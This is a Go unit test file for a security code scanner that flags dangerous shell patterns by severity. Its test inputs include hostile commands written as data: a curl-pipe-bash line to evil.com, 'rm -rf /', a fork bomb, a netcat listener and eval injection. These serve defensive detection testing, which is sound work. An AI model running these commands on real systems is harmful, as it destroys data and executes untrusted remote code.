package security

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewCodeScanner(t *testing.T) {
	scanner := NewCodeScanner()
	require.NotNil(t, scanner)
	assert.NotEmpty(t, scanner.rules)
	assert.Equal(t, SeverityLow, scanner.threshold)
}

func TestCodeScanner_SetThreshold(t *testing.T) {
	scanner := NewCodeScanner()

	tests := []struct {
		name      string
		threshold Severity
	}{
		{"Set to Critical", SeverityCritical},
		{"Set to High", SeverityHigh},
		{"Set to Medium", SeverityMedium},
		{"Set to Low", SeverityLow},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scanner.SetThreshold(tt.threshold)
			assert.Equal(t, tt.threshold, scanner.threshold)
		})
	}
}

func TestCodeScanner_AddRule(t *testing.T) {
	scanner := NewCodeScanner()
	initialCount := len(scanner.rules)

	customRule := &ScanRule{
		Name:        "test-rule",
		Pattern:     regexp.MustCompile(`test-pattern`),
		Severity:    SeverityHigh,
		Description: "Test description for at least ten characters",
		Fix:         "Test fix for pattern",
	}

	scanner.AddRule(customRule)
	assert.Len(t, scanner.rules, initialCount+1)
	assert.Contains(t, scanner.rules, customRule)
}

func TestCodeScanner_ShouldReport(t *testing.T) {
	tests := []struct {
		name      string
		threshold Severity
		severity  Severity
		expected  bool
	}{
		{"Critical with Low threshold", SeverityLow, SeverityCritical, true},
		{"High with Low threshold", SeverityLow, SeverityHigh, true},
		{"Medium with Low threshold", SeverityLow, SeverityMedium, true},
		{"Low with Low threshold", SeverityLow, SeverityLow, true},
		{"Low with High threshold", SeverityHigh, SeverityLow, false},
		{"Medium with High threshold", SeverityHigh, SeverityMedium, false},
		{"High with High threshold", SeverityHigh, SeverityHigh, true},
		{"Critical with Critical threshold", SeverityCritical, SeverityCritical, true},
		{"High with Critical threshold", SeverityCritical, SeverityHigh, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scanner := NewCodeScanner()
			scanner.SetThreshold(tt.threshold)
			result := scanner.shouldReport(tt.severity)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestCodeScanner_Scan_EmptyDirectory(t *testing.T) {
	// Create temp directory
	tmpDir := t.TempDir()

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)
	require.NotNil(t, result)

	assert.Empty(t, result.Findings)
	assert.Equal(t, 0, result.FilesScanned)
	assert.True(t, result.Clean)
	assert.Equal(t, 0, result.Stats["critical"])
	assert.Equal(t, 0, result.Stats["high"])
}

func TestCodeScanner_Scan_CleanFile(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a clean file
	cleanFile := filepath.Join(tmpDir, "clean.sh")
	err := os.WriteFile(cleanFile, []byte("#!/bin/bash\necho 'Hello World'\n"), 0644)
	require.NoError(t, err)

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)
	require.NotNil(t, result)

	assert.Equal(t, 1, result.FilesScanned)
	assert.True(t, result.Clean)
}

func TestCodeScanner_Scan_MaliciousPatterns(t *testing.T) {
	tests := []struct {
		name         string
		content      string
		expectedRule string
		expectedSev  Severity
	}{
		{
			name:         "Eval injection",
			content:      "eval \"$user_input\"",
			expectedRule: "eval-injection",
			expectedSev:  SeverityCritical,
		},
		{
			name:         "Exec call",
			content:      "exec($command)",
			expectedRule: "exec-injection",
			expectedSev:  SeverityCritical,
		},
		{
			name:         "Curl pipe bash",
			content:      "curl http://evil.com/script.sh | bash",
			expectedRule: "curl-pipe-bash",
			expectedSev:  SeverityCritical,
		},
		{
			name:         "rm -rf root",
			content:      "rm -rf /",
			expectedRule: "rm-rf-root",
			expectedSev:  SeverityCritical,
		},
		{
			name:         "Fork bomb",
			content:      ":(){:|:&};:",
			expectedRule: "fork-bomb",
			expectedSev:  SeverityCritical,
		},
		{
			name:         "Netcat listen",
			content:      "nc -l 4444",
			expectedRule: "netcat-listen",
			expectedSev:  SeverityHigh,
		},
		{
			name:         "Chmod 777",
			content:      "chmod 777 /important/file",
			expectedRule: "chmod-777",
			expectedSev:  SeverityHigh,
		},
		{
			name:         "Base64 decode",
			content:      "echo 'encoded' | base64 -d",
			expectedRule: "base64-decode",
			expectedSev:  SeverityMedium,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()

			// Create file with malicious content
			testFile := filepath.Join(tmpDir, "test.sh")
			err := os.WriteFile(testFile, []byte(tt.content), 0644)
			require.NoError(t, err)

			scanner := NewCodeScanner()
			result, err := scanner.Scan(tmpDir)
			require.NoError(t, err)
			require.NotNil(t, result)

			assert.NotEmpty(t, result.Findings)

			// Find the expected rule in findings
			found := false
			for _, finding := range result.Findings {
				if finding.Rule.Name == tt.expectedRule {
					found = true
					assert.Equal(t, tt.expectedSev, finding.Severity)
					assert.Equal(t, testFile, finding.File)
					assert.Equal(t, 1, finding.Line)
					break
				}
			}
			assert.True(t, found, "Expected rule %s not found", tt.expectedRule)
		})
	}
}

func TestCodeScanner_Scan_ThresholdFiltering(t *testing.T) {
	tmpDir := t.TempDir()

	// Create file with low severity issue
	testFile := filepath.Join(tmpDir, "test.js")
	err := os.WriteFile(testFile, []byte("console.log('debug message')"), 0644)
	require.NoError(t, err)

	// Scan with High threshold - should not report console.log (low severity)
	scanner := NewCodeScanner()
	scanner.SetThreshold(SeverityHigh)
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	assert.Empty(t, result.Findings, "Low severity issues should be filtered with High threshold")

	// Scan with Low threshold - should report everything
	scanner.SetThreshold(SeverityLow)
	result, err = scanner.Scan(tmpDir)
	require.NoError(t, err)

	assert.NotEmpty(t, result.Findings, "Low severity issues should be reported with Low threshold")
}

func TestCodeScanner_Scan_MultipleFiles(t *testing.T) {
	tmpDir := t.TempDir()

	// Create subdirectory
	subDir := filepath.Join(tmpDir, "subdir")
	err := os.Mkdir(subDir, 0755)
	require.NoError(t, err)

	// Create multiple files
	files := []struct {
		path    string
		content string
	}{
		{filepath.Join(tmpDir, "file1.sh"), "echo 'clean'"},
		{filepath.Join(tmpDir, "file2.sh"), "rm -rf /"},
		{filepath.Join(subDir, "file3.sh"), "eval $input"},
	}

	for _, f := range files {
		err = os.WriteFile(f.path, []byte(f.content), 0644)
		require.NoError(t, err)
	}

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	assert.Equal(t, 3, result.FilesScanned)
	assert.Len(t, result.Findings, 2, "Should find 2 malicious patterns")
	assert.False(t, result.Clean, "Should not be clean with critical findings")
}

func TestCodeScanner_Scan_LargeFileSkipped(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a large file (>1MB)
	largeFile := filepath.Join(tmpDir, "large.bin")
	data := make([]byte, 2*1024*1024) // 2MB
	err := os.WriteFile(largeFile, data, 0644)
	require.NoError(t, err)

	// Create a small file with malicious content
	smallFile := filepath.Join(tmpDir, "small.sh")
	err = os.WriteFile(smallFile, []byte("eval $input"), 0644)
	require.NoError(t, err)

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	// Only small file should be scanned
	assert.Equal(t, 1, result.FilesScanned, "Large file should be skipped")
	assert.NotEmpty(t, result.Findings)
}

func TestCodeScanner_Scan_NonExistentDirectory(t *testing.T) {
	scanner := NewCodeScanner()
	result, err := scanner.Scan("/nonexistent/path/to/directory")

	assert.Error(t, err)
	assert.Nil(t, result)
}

func TestScanResult_Statistics(t *testing.T) {
	tmpDir := t.TempDir()

	// Create file with multiple severity levels
	content := `
#!/bin/bash
rm -rf /           # Critical
eval $input        # Critical
nc -l 4444         # High
chmod 777 file     # High
base64 -d data     # Medium
console.log('x')   # Low
`
	testFile := filepath.Join(tmpDir, "test.sh")
	err := os.WriteFile(testFile, []byte(content), 0644)
	require.NoError(t, err)

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	// Verify statistics
	assert.Greater(t, result.Stats["critical"], 0, "Should have critical findings")
	assert.Greater(t, result.Stats["high"], 0, "Should have high findings")
	assert.False(t, result.Clean, "Should not be clean with critical/high findings")
}

func TestSeverityConstants(t *testing.T) {
	assert.Equal(t, Severity("critical"), SeverityCritical)
	assert.Equal(t, Severity("high"), SeverityHigh)
	assert.Equal(t, Severity("medium"), SeverityMedium)
	assert.Equal(t, Severity("low"), SeverityLow)
}

func TestScanRule_Structure(t *testing.T) {
	rule := &ScanRule{
		Name:        "test-rule",
		Pattern:     regexp.MustCompile(`test`),
		Severity:    SeverityHigh,
		Description: "Test description",
		Fix:         "Test fix",
	}

	assert.NotEmpty(t, rule.Name)
	assert.NotNil(t, rule.Pattern)
	assert.NotEmpty(t, rule.Severity)
	assert.NotEmpty(t, rule.Description)
	assert.NotEmpty(t, rule.Fix)
}

func TestScanFinding_Structure(t *testing.T) {
	rule := &ScanRule{
		Name:     "test",
		Pattern:  regexp.MustCompile(`test`),
		Severity: SeverityHigh,
	}

	finding := &ScanFinding{
		Rule:     rule,
		File:     "/path/to/file",
		Line:     10,
		Content:  "test content",
		Severity: SeverityHigh,
	}

	assert.NotNil(t, finding.Rule)
	assert.Equal(t, "/path/to/file", finding.File)
	assert.Equal(t, 10, finding.Line)
	assert.Equal(t, "test content", finding.Content)
	assert.Equal(t, SeverityHigh, finding.Severity)
}

func TestDefaultScanRules(t *testing.T) {
	rules := defaultScanRules()

	assert.NotEmpty(t, rules, "Should have default rules")
	assert.Greater(t, len(rules), 40, "Should have at least 40 rules")

	// Verify some critical rules exist
	criticalRules := []string{
		"eval-injection",
		"exec-injection",
		"curl-pipe-bash",
		"rm-rf-root",
		"fork-bomb",
	}

	ruleMap := make(map[string]bool)
	for _, rule := range rules {
		ruleMap[rule.Name] = true
		assert.NotEmpty(t, rule.Description, "Rule %s should have description", rule.Name)
		assert.NotEmpty(t, rule.Fix, "Rule %s should have fix", rule.Name)
		assert.NotNil(t, rule.Pattern, "Rule %s should have pattern", rule.Name)
	}

	for _, name := range criticalRules {
		assert.True(t, ruleMap[name], "Critical rule %s should exist", name)
	}
}

func TestCodeScanner_Scan_MultilineFinding(t *testing.T) {
	tmpDir := t.TempDir()

	// Create file with malicious pattern on different lines
	content := `#!/bin/bash
# This is a comment
echo "Starting script"
rm -rf /
echo "Done"
`
	testFile := filepath.Join(tmpDir, "test.sh")
	err := os.WriteFile(testFile, []byte(content), 0644)
	require.NoError(t, err)

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	assert.Len(t, result.Findings, 1)
	assert.Equal(t, 4, result.Findings[0].Line, "Should report correct line number")
	assert.Contains(t, result.Findings[0].Content, "rm -rf")
}

func TestCodeScanner_Scan_DirectoryTraversal(t *testing.T) {
	tmpDir := t.TempDir()

	// Create nested directory structure
	level1 := filepath.Join(tmpDir, "level1")
	level2 := filepath.Join(level1, "level2")
	err := os.MkdirAll(level2, 0755)
	require.NoError(t, err)

	// Create files at different levels
	files := []string{
		filepath.Join(tmpDir, "root.sh"),
		filepath.Join(level1, "l1.sh"),
		filepath.Join(level2, "l2.sh"),
	}

	for _, f := range files {
		err = os.WriteFile(f, []byte("echo 'test'"), 0644)
		require.NoError(t, err)
	}

	scanner := NewCodeScanner()
	result, err := scanner.Scan(tmpDir)
	require.NoError(t, err)

	assert.Equal(t, 3, result.FilesScanned, "Should scan all files in nested directories")
}

func TestCodeScanner_Scan_CleanDetermination(t *testing.T) {
	tests := []struct {
		name    string
		content string
		isClean bool
	}{
		{
			name:    "No findings",
			content: "echo 'hello'",
			isClean: true,
		},
		{
			name:    "Low severity only",
			content: "console.log('debug')",
			isClean: true, // Clean means no critical/high
		},
		{
			name:    "Medium severity only",
			content: "base64 -d data",
			isClean: true, // Clean means no critical/high
		},
		{
			name:    "High severity",
			content: "chmod 777 file",
			isClean: false,
		},
		{
			name:    "Critical severity",
			content: "rm -rf /",
			isClean: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()

			testFile := filepath.Join(tmpDir, "test.sh")
			err := os.WriteFile(testFile, []byte(tt.content), 0644)
			require.NoError(t, err)

			scanner := NewCodeScanner()
			result, err := scanner.Scan(tmpDir)
			require.NoError(t, err)

			assert.Equal(t, tt.isClean, result.Clean)
		})
	}
}
